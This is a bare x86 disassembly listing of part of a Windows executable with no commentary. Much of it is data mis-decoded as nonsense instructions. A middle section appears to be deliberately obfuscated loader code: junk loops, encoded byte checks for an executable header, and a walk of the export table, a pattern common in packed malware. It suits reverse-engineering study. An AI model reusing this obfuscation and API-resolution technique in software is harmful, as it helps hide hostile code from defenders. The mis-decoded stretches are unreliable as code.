  40e194:	shl    esp,0xba
  40e197:	or     DWORD PTR [ebx-0x4c],esp
  40e19a:	or     eax,0x5c9fe388
  40e19f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1a0:	addr16 push edx
  40e1a2:	clc    
  40e1a3:	push   0xffffffbd
  40e1a5:	iret   
  40e1a6:	js     0x40e14f
  40e1a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1a9:	xor    al,0x39
  40e1ab:	add    ch,BYTE PTR ds:0x7c929f17
  40e1b1:	sahf   
  40e1b2:	iret   
  40e1b3:	out    dx,eax
  40e1b4:	sbb    dh,BYTE PTR [esi]
  40e1b6:	jmp    0x40e1c6
  40e1b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1b9:	or     al,0xb7
  40e1bb:	mov    ds,WORD PTR [eax-0x7f]
  40e1be:	mov    eax,ds:0x93b5b28a
  40e1c3:	ins    BYTE PTR es:[edi],dx
  40e1c4:	aam    0x63
  40e1c6:	push   ds
  40e1c7:	cdq    
  40e1c8:	sbb    DWORD PTR [edx],esp
  40e1ca:	xor    eax,0x8dda1e1b
  40e1cf:	rcl    BYTE PTR [ecx*1-0x49fc8c7e],1
  40e1d6:	jecxz  0x40e187
  40e1d8:	jl     0x40e22e
  40e1da:	push   esi
  40e1db:	sub    BYTE PTR [ecx+0x65c8367d],al
  40e1e1:	pop    eax
  40e1e2:	or     BYTE PTR [ebp+0x3442aef3],bh
  40e1e8:	push   eax
  40e1e9:	shr    esi,0x92
  40e1ec:	jecxz  0x40e1dd
  40e1ee:	xchg   edi,eax
  40e1ef:	mov    eax,0xc51aca49
  40e1f4:	add    BYTE PTR [esi],ch
  40e1f6:	sbb    eax,0xd0ab648b
  40e1fb:	fdivr  st(1),st
  40e1fd:	jmp    0x9ef4:0x42335671
  40e204:	sbb    eax,0xf7b7fc40
  40e209:	cmp    al,0xdd
  40e20b:	test   al,0xf
  40e20d:	daa    
  40e20e:	xchg   edx,eax
  40e20f:	xchg   ebp,eax
  40e210:	push   ss
  40e211:	inc    esi
  40e212:	mov    ch,0x11
  40e214:	out    0xb3,eax
  40e216:	cmp    al,0x8b
  40e218:	pop    es
  40e219:	dec    edx
  40e21a:	push   ebp
  40e21b:	retf   0x26a
  40e21e:	outs   dx,DWORD PTR ds:[esi]
  40e21f:	or     ah,0x3e
  40e222:	in     eax,0x9
  40e224:	jne    0x40e29e
  40e226:	scas   eax,DWORD PTR es:[edi]
  40e227:	dec    esi
  40e228:	inc    edx
  40e229:	adc    esp,ebx
  40e22b:	mov    ah,0xb6
  40e22d:	loope  0x40e2ad
  40e22f:	fs int 0x88
  40e232:	xor    eax,0x1afb6765
  40e237:	inc    esp
  40e238:	in     eax,dx
  40e239:	clc    
  40e23a:	ins    DWORD PTR es:[edi],dx
  40e23b:	pop    esi
  40e23c:	jne    0x40e1cc
  40e23e:	gs test eax,0xdd0360ee
  40e244:	push   edi
  40e245:	push   ecx
  40e246:	sub    ecx,DWORD PTR [edi]
  40e248:	fisubr WORD PTR [eax+0x1bfc513]
  40e24e:	es push esp
  40e250:	push   0xb8c73225
  40e255:	fild   QWORD PTR [eax-0x4a]
  40e258:	(bad)  
  40e259:	ficom  DWORD PTR [ecx-0x4fb839a6]
  40e25f:	retf   0xb301
  40e262:	lods   eax,DWORD PTR ds:[esi]
  40e263:	scas   al,BYTE PTR es:[edi]
  40e264:	call   0x5a5fe10f
  40e269:	and    esp,ebx
  40e26b:	mov    bl,0x9f
  40e26d:	jno    0x40e255
  40e26f:	fnstenv [edi-0x2588699]
  40e275:	(bad)  
  40e276:	mov    edx,0xf127454e
  40e27b:	imul   dh
  40e27d:	mov    edx,DWORD PTR [edi+0x5b]
  40e280:	cld    
  40e281:	xchg   ecx,eax
  40e282:	adc    al,0xfa
  40e284:	lock loope 0x40e275
  40e287:	out    0x3,eax
  40e289:	jnp    0x40e2d5
  40e28b:	xor    DWORD PTR [ecx+0x74],edx
  40e28e:	jle    0x40e281
  40e290:	cld    
  40e291:	xor    eax,0x430654a8
  40e296:	pop    ebx
  40e297:	mov    ebp,0x887db200
  40e29c:	icebp  
  40e29d:	and    edi,esi
  40e29f:	mov    esi,0x20c04337
  40e2a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2a5:	xor    BYTE PTR [ecx+0x34d1b6d8],dh
  40e2ab:	sbb    DWORD PTR [ebp+0x5a29effa],esp
  40e2b1:	add    edi,DWORD PTR ss:[eax-0x16a7dbc6]
  40e2b8:	push   0xc0cde77
  40e2bd:	rol    DWORD PTR [edx],1
  40e2bf:	shl    cl,0xbe
  40e2c2:	test   al,0xf4
  40e2c4:	push   ebx
  40e2c5:	inc    ecx
  40e2c6:	mov    esp,0x7119e50f
  40e2cb:	(bad)  
  40e2cc:	and    esi,DWORD PTR [eax]
  40e2ce:	dec    eax
  40e2cf:	mov    ds:0xf1a1f1d8,eax
  40e2d4:	jge    0x40e2e0
  40e2d6:	outs   dx,DWORD PTR ds:[esi]
  40e2d7:	fdiv   DWORD PTR [ecx]
  40e2d9:	add    eax,0x22b6104e
  40e2de:	fst    QWORD PTR [esp+ecx*4]
  40e2e1:	fnstsw WORD PTR [eax]
  40e2e3:	push   edi
  40e2e4:	es cli 
  40e2e6:	fimul  WORD PTR [ebp+0x52ae0cde]
  40e2ec:	add    eax,0xa6172fde
  40e2f1:	bound  esi,QWORD PTR [esi+ecx*1]
  40e2f4:	or     eax,0xfee31c57
  40e2f9:	and    DWORD PTR [ebx],0x8f621f4b
  40e2ff:	xlat   BYTE PTR ds:[ebx]
  40e300:	xchg   esi,eax
  40e301:	xor    BYTE PTR [ebp+0x5599fe0f],dl
  40e307:	(bad)  
  40e308:	test   eax,0x547faba1
  40e30d:	sub    BYTE PTR ds:[eax-0x68],al
  40e311:	inc    ebx
  40e312:	inc    eax
  40e313:	and    BYTE PTR [edi-0x78d88c61],dh
  40e319:	add    eax,0x77e68928
  40e31e:	fbld   TBYTE PTR [ecx]
  40e320:	xchg   ebx,eax
  40e321:	dec    ebx
  40e322:	add    DWORD PTR [eax-0x1a0ce66],eax
  40e328:	rsm    
  40e32a:	shl    edx,0x38
  40e32d:	retf   0x6ffc
  40e330:	mov    DWORD PTR [edx-0x6d],ebx
  40e333:	nop
  40e334:	xchg   edx,eax
  40e335:	hlt    
  40e336:	adc    eax,0x14e916a8
  40e33b:	ins    DWORD PTR es:[edi],dx
  40e33c:	lahf   
  40e33d:	jmp    0x86b7:0xa5149dfc
  40e344:	(bad)  [edi]
  40e346:	mov    ecx,0x84e21122
  40e34b:	xchg   ebp,eax
  40e34c:	pop    DWORD PTR ds:0xe8ade531
  40e352:	stc    
  40e353:	push   ebp
  40e354:	jae    0x40e3a4
  40e356:	push   ebp
  40e357:	imul   edi,ebp,0xf
  40e35a:	xor    DWORD PTR [eax-0x141bfd5b],0x99030517
  40e364:	dec    ecx
  40e365:	push   eax
  40e366:	dec    eax
  40e367:	dec    ebx
  40e368:	add    esp,ecx
  40e36a:	fsubr  st(6),st
  40e36c:	push   ebx
  40e36d:	fild   QWORD PTR ds:0x9ddbec8
  40e373:	jp     0x40e3d4
  40e375:	aaa    
  40e376:	ret    
  40e377:	sub    edi,DWORD PTR [eax]
  40e379:	dec    ecx
  40e37a:	sbb    al,0x3
  40e37c:	ret    0xaf0f
  40e37f:	push   es
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0xe255ef2
  40e671:	add    eax,0x7aca7384
  40e676:	jp     0x40e691
  40e678:	pop    edi
  40e679:	jp     0x40e6f5
  40e67b:	inc    ebp
  40e67c:	sbb    esi,DWORD PTR [edx]
  40e67e:	repz or BYTE PTR ds:0xfa3b2a88,dl
  40e685:	xchg   DWORD PTR [ecx+eiz*2-0x40],ebx
  40e689:	inc    BYTE PTR [ecx-0x528ec112]
  40e68f:	push   eax
  40e690:	pop    eax
  40e691:	jg     0x40e64e
  40e693:	inc    edx
  40e694:	mov    ebx,0xa33adbe9
  40e699:	fmul   DWORD PTR [edx+0x24]
  40e69c:	and    BYTE PTR [esi+ebx*4+0x4dbffcf1],0x45
  40e6a4:	call   0x6559:0x85685033
  40e6ab:	mov    ebx,?
  40e6ad:	pop    eax
  40e6ae:	push   0xc29dac6f
  40e6b3:	mov    ds:0x10902956,al
  40e6b8:	(bad)  
  40e6b9:	js     0x40e732
  40e6bb:	lock fwait
  40e6bd:	add    bh,al
  40e6bf:	inc    edi
  40e6c0:	push   0xb71d0cb7
  40e6c5:	inc    ecx
  40e6c6:	mov    ah,0x69
  40e6c8:	call   0x19e0:0x75556b29
  40e6cf:	out    dx,eax
  40e6d0:	test   al,0xe1
  40e6d2:	pop    eax
  40e6d3:	sar    BYTE PTR [esi-0x7d1aaf55],0x40
  40e6da:	lahf   
  40e6db:	cmp    al,0x91
  40e6dd:	scas   al,BYTE PTR es:[edi]
  40e6de:	stos   DWORD PTR es:[edi],eax
  40e6df:	jo     0x40e75f
  40e6e1:	jnp    0x40e736
  40e6e3:	fwait
  40e6e4:	jp     0x40e70c
  40e6e6:	mov    al,0x36
  40e6e8:	cwde   
  40e6e9:	in     eax,0xce
  40e6eb:	pop    edx
  40e6ec:	jmp    0x40e6f6
  40e6ee:	arpl   WORD PTR [esi],sp
  40e6f0:	add    DWORD PTR [ebx-0x61],esi
  40e6f3:	(bad)  
  40e6f4:	or     eax,0xbc54da7c
  40e6f9:	hlt    
  40e6fa:	xchg   ebx,eax
  40e6fb:	jno    0x40e6e2
  40e6fd:	ret    0x2431
  40e700:	retf   
  40e701:	xchg   ebx,eax
  40e702:	scas   al,BYTE PTR es:[edi]
  40e703:	rcr    BYTE PTR [edi],1
  40e705:	push   edx
  40e706:	repnz outs dx,DWORD PTR ds:[esi]
  40e708:	push   ss
  40e709:	jne    0x40e6e8
  40e70b:	fs inc ebx
  40e70d:	imul   ch
  40e70f:	or     eax,0x947fd8c5
  40e714:	pop    esp
  40e715:	repnz mov cl,0x27
  40e718:	mov    ds:0x8084de20,al
  40e71d:	pop    edx
  40e71f:	leave  
  40e720:	fcmovb st,st(4)
  40e722:	inc    ebx
  40e723:	in     al,0x94
  40e725:	not    DWORD PTR ds:0x95aff7f4
  40e72b:	iret   
  40e72c:	mov    bl,0xde
  40e72e:	retf   
  40e72f:	mov    al,es:0x5585607b
  40e735:	sbb    al,0xcd
  40e737:	jb     0x40e734
  40e739:	sbb    ebx,DWORD PTR ds:0x225d6143
  40e73f:	xchg   BYTE PTR ds:0x5a49e1a6,al
  40e745:	jmp    0xb039:0xe451fa93
  40e74c:	clc    
  40e74d:	dec    esi
  40e74e:	imul   esi,DWORD PTR [eax+esi*4-0x4e],0x46e54b75
  40e756:	cmp    eax,0xbccf7956
  40e75b:	mov    ah,0x36
  40e75d:	jnp    0x40e7cc
  40e75f:	add    ah,dl
  40e761:	push   edi
  40e762:	cmp    BYTE PTR [edx],bl
  40e764:	out    dx,al
  40e765:	inc    eax
  40e766:	and    al,0xdb
  40e768:	dec    ecx
  40e769:	ins    DWORD PTR es:[edi],dx
  40e76a:	out    0xa3,eax
  40e76c:	sbb    edx,esp
  40e76e:	test   DWORD PTR [edx-0x140cd0e1],edi
  40e774:	mov    cl,0x45
  40e776:	fisttp DWORD PTR [eax+eax*8]
  40e779:	loop   0x40e75b
  40e77b:	push   es
  40e77c:	in     eax,dx
  40e77d:	add    BYTE PTR [edi],0x52
  40e780:	popa   
  40e781:	std    
  40e782:	xor    eax,0x1e104fa2
  40e787:	call   DWORD PTR [ebx]
  40e789:	push   ebp
  40e78a:	push   eax
  40e78b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e78c:	fsubr  st,st(2)
  40e78e:	enter  0xc717,0x90
  40e792:	repz test al,0xc1
  40e795:	pop    ebx
  40e796:	inc    ebx
  40e797:	std    
  40e798:	pop    edi
  40e799:	mov    eax,ds:0xff2e9a5b
  40e79e:	jg     0x40e7d8
  40e7a0:	pushf  
  40e7a1:	inc    ecx
  40e7a2:	data16 test BYTE PTR [esp+ebp*2+0x4b4d869d],cl
  40e7aa:	sub    ch,bh
  40e7ac:	sub    BYTE PTR [ecx+edi*2+0x36acff20],dh
  40e7b3:	je     0x40e7ad
  40e7b5:	xchg   esi,eax
  40e7b6:	fild   QWORD PTR ds:0x75bb0227
  40e7bc:	dec    edi
  40e7bd:	or     DWORD PTR ds:0x763002af,esp
  40e7c3:	repnz mov ds:0x9f8aff79,al
  40e7c9:	retf   0x99c9
  40e7cc:	jge    0x40e7ee
  40e7ce:	scas   al,BYTE PTR es:[edi]
  40e7cf:	xor    eax,ecx
  40e7d1:	dec    ebp
  40e7d2:	xchg   ebp,eax
  40e7d3:	repz mov ebx,0xc4d3b19a
  40e7d9:	ja     0x40e7c4
  40e7db:	test   eax,0xaa71bd6e
  40e7e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7e1:	daa    
  40e7e2:	push   edi
  40e7e3:	out    dx,eax
  40e7e4:	sbb    cl,BYTE PTR [ebp-0x75]
  40e7e7:	out    dx,eax
  40e7e8:	pushf  
  40e7e9:	jnp    0x40e7d9
  40e7eb:	mov    al,0x71
  40e7ed:	push   eax
  40e7ee:	mov    ds:0x1dba21d2,al
  40e7f3:	add    dh,BYTE PTR [ebp+0x6e]
  40e7f6:	fild   DWORD PTR [edx]
  40e7f8:	add    al,0x5b
  40e7fa:	mov    al,ds:0xb904e4d
  40e7ff:	test   DWORD PTR [ebp+edx*1-0x1fcf4bc9],esi
  40e806:	hlt    
  40e807:	pop    es
  40e808:	cmp    eax,0x74e9d7e9
  40e80d:	xchg   DWORD PTR [esi-0x6d],edi
  40e810:	fidiv  DWORD PTR [ebx-0x565d12c]
  40e816:	push   ds
  40e817:	ret    
  40e818:	sbb    ebx,DWORD PTR [ebx+0x75ebfc3]
  40e81e:	daa    
  40e81f:	sub    ch,bl
  40e821:	jmp    0xf8b6516c
  40e826:	mov    bl,0x8a
  40e828:	inc    ecx
  40e829:	js     0x40e847
  40e82b:	mov    DWORD PTR [ecx],edi
  40e82d:	loopne 0x40e809
  40e82f:	(bad)  
  40e831:	push   ecx
  40e832:	mov    DWORD PTR [eax+edi*1],ebx
  40e835:	out    0x3b,eax
  40e837:	cdq    
  40e838:	or     DWORD PTR [ebx*2+0x562f9cbf],eax
  40e83f:	sbb    BYTE PTR [esi+0x62f7bf8b],dl
  40e845:	or     bl,BYTE PTR [ebx-0x8]
  40e848:	cmc    
  40e849:	sbb    BYTE PTR [ebx+ebx*8],al
  40e84c:	or     BYTE PTR ds:0x49d8aa03,bl
  40e852:	hlt    
  40e853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e854:	cmp    al,0xde
  40e856:	gs (bad) 
  40e858:	fldcw  WORD PTR [esi+0x41]
  40e85b:	pusha  
  40e85c:	aaa    
  40e85d:	repz xchg edx,eax
  40e85f:	xlat   BYTE PTR ds:[ebx]
  40e860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e861:	rcl    DWORD PTR [esi],cl
  40e863:	push   cs
  40e864:	cmp    DWORD PTR [edx-0x4c],ecx
  40e867:	mov    edx,0xf0ad7b29
  40e86c:	inc    eax
  40e86d:	mov    eax,ds:0xfda1509
  40e872:	sysret 
  40e874:	xchg   ebx,eax
  40e875:	(bad)  [ecx+0x589857c2]
  40e87b:	lea    ebp,[ecx-0x2c]
  40e87e:	popf   
  40e87f:	ret    
  40e880:	enter  0x7d03,0xb9
  40e884:	ja     0x40e853
  40e886:	dec    esi
  40e887:	mov    eax,DWORD PTR [edi+0x75787e42]
  40e88d:	mov    edx,0x3f4bd9c3
  40e892:	sti    
  40e893:	jl     0x40e8cf
  40e895:	add    al,0xea
  40e897:	jmp    0x40e88e
  40e899:	mov    cl,0x13
  40e89b:	(bad)  
  40e89c:	jmp    0x40e838
  40e89e:	addr16 jmp 0xc5ff:0xa6632b1d
  40e8a6:	adc    DWORD PTR [edx+0x18],ebp
  40e8a9:	dec    ecx
  40e8aa:	iret   
  40e8ab:	xlat   BYTE PTR ds:[ebx]
  40e8ac:	mov    ebx,0x6878707f
  40e8b1:	jb     0x40e865
  40e8b3:	std    
  40e8b4:	sar    DWORD PTR [eax-0x27],1
  40e8b7:	addr16 pop esp
  40e8b9:	pop    ebx
  40e8ba:	icebp  
  40e8bb:	or     esi,DWORD PTR [ebx+esi*1]
  40e8be:	popa   
  40e8bf:	ss inc ebp
  40e8c1:	mov    ah,0x4
  40e8c3:	mov    bl,0x81
  40e8c5:	imul   esp,DWORD PTR [esi],0xb5de2896
  40e8cb:	ins    BYTE PTR es:[edi],dx
  40e8cc:	mov    ebx,DWORD PTR [ebx]
  40e8ce:	adc    dl,al
  40e8d0:	xor    bl,0xe5
  40e8d3:	outs   dx,DWORD PTR ds:[esi]
  40e8d4:	pop    ss
  40e8d5:	mov    ah,cl
  40e8d7:	jp     0x40e8f3
  40e8d9:	inc    edx
  40e8da:	add    DWORD PTR [ebx],esi
  40e8dc:	das    
  40e8dd:	cwde   
  40e8de:	sahf   
  40e8df:	jo     0x40e8a9
  40e8e1:	call   0x2a4:0x5af4805c
  40e8e8:	fucomp st(4)
  40e8ea:	push   0xfe88e22
  40e8ef:	cmp    DWORD PTR [edx-0x1e24af3c],0x38a501fc
  40e8f9:	rcr    DWORD PTR [edx-0x565ca7f2],cl
  40e8ff:	mov    ch,0xe5
  40e901:	or     BYTE PTR [ecx],0x8c
  40e904:	aas    
  40e905:	outs   dx,DWORD PTR ds:[esi]
  40e906:	cmp    edi,esi
  40e908:	scas   eax,DWORD PTR es:[edi]
  40e909:	mov    bl,0x7b
  40e90b:	pcmpgtb mm2,QWORD PTR [esi-0x12]
  40e90f:	(bad)  
  40e911:	repnz inc esi
  40e913:	sbb    ebp,edi
  40e915:	ins    DWORD PTR es:[edi],dx
  40e916:	pop    ss
  40e917:	jo     0x40e902
  40e919:	cli    
  40e91a:	je     0x40e909
  40e91c:	(bad)  
  40e91d:	xchg   dx,ax
  40e91f:	cli    
  40e920:	add    cl,BYTE PTR [eax]
  40e922:	popf   
  40e923:	imul   ebx,DWORD PTR es:[ecx-0x58],0x5b
  40e928:	ja     0x40e98e
  40e92a:	jnp    0x40e906
  40e92c:	dec    ebp
  40e92d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e92e:	outs   dx,DWORD PTR ds:[esi]
  40e92f:	jns    0x40e8b7
  40e931:	std    
  40e932:	sahf   
  40e933:	inc    edx
  40e934:	sub    al,0x6a
  40e936:	test   bh,dh
  40e938:	jb     0x40e92f
  40e93a:	mov    bh,0x66
  40e93c:	adc    al,0x7b
  40e93e:	dec    ebp
  40e93f:	xchg   edi,eax
  40e940:	or     al,0x3a
  40e942:	add    edx,DWORD PTR [esi+0x7a]
  40e945:	sub    eax,0xff935efe
  40e94a:	jno    0x40e91f
  40e94c:	mov    ds:0x4ecc6e0d,eax
  40e951:	mov    dl,0x19
  40e953:	dec    esp
  40e954:	das    
  40e955:	cmp    esp,DWORD PTR [edi+0x5b]
  40e958:	mov    dl,0x7
  40e95a:	pusha  
  40e95b:	into   
  40e95c:	sbb    DWORD PTR ds:0x5538fee6,0xffffffd3
  40e963:	cwde   
  40e964:	xor    al,al
  40e966:	mov    ah,BYTE PTR [ebx]
  40e968:	cmc    
  40e969:	popa   
  40e96a:	lahf   
  40e96b:	jg     0x40e954
  40e96d:	(bad)  
  40e96e:	stc    
  40e96f:	mov    ?,WORD PTR [ecx+0x34]
  40e972:	iret   
  40e973:	cmp    cl,bh
  40e975:	hlt    
  40e976:	cmp    eax,0xab3667c9
  40e97b:	scas   al,BYTE PTR es:[edi]
  40e97c:	xor    BYTE PTR [edx+0x4c],bh
  40e97f:	fwait
  40e980:	int    0xb4
  40e982:	push   ecx
  40e983:	fidivr DWORD PTR [edi-0x4e843d9a]
  40e989:	cdq    
  40e98a:	or     al,0xda
  40e98c:	gs dec eax
  40e98e:	inc    esi
  40e98f:	dec    ebx
  40e990:	sub    al,0x63
  40e992:	sub    al,0xe2
  40e994:	and    al,BYTE PTR [ebp-0x1]
  40e997:	dec    ebp
  40e998:	pop    ecx
  40e999:	inc    eax
  40e99a:	mov    DWORD PTR [eax+ebp*4-0x672dc832],ebp
  40e9a1:	pop    ds
  40e9a2:	rcl    DWORD PTR [ebp-0x2d2db903],cl
  40e9a8:	aam    0x34
  40e9aa:	js     0x40e9b7
  40e9ac:	stos   BYTE PTR es:[edi],al
  40e9ad:	push   0xffffffd4
  40e9af:	les    ebp,FWORD PTR [eax+esi*1]
  40e9b2:	fwait
  40e9b3:	out    0x67,al
  40e9b5:	sbb    bh,BYTE PTR [esi]
  40e9b7:	lock (bad) [eax]
  40e9ba:	scas   eax,DWORD PTR es:[edi]
  40e9bb:	jno    0x40e973
  40e9bd:	dec    esp
  40e9be:	icebp  
  40e9bf:	ins    BYTE PTR es:[edi],dx
  40e9c0:	enter  0x5671,0x21
  40e9c4:	adc    bl,BYTE PTR ds:0xa421bcbd
  40e9ca:	sub    BYTE PTR fs:[ebx-0x4b],ch
  40e9ce:	add    eax,0x82fefc00
  40e9d3:	or     DWORD PTR [ecx+0x69],ebx
  40e9d6:	sbb    al,0x0
  40e9d8:	mov    ebp,0xc367961a
  40e9dd:	jmp    0x8e99:0xafd000e
  40e9e4:	cs std 
  40e9e6:	sub    bh,BYTE PTR [edi+0x4483e1d3]
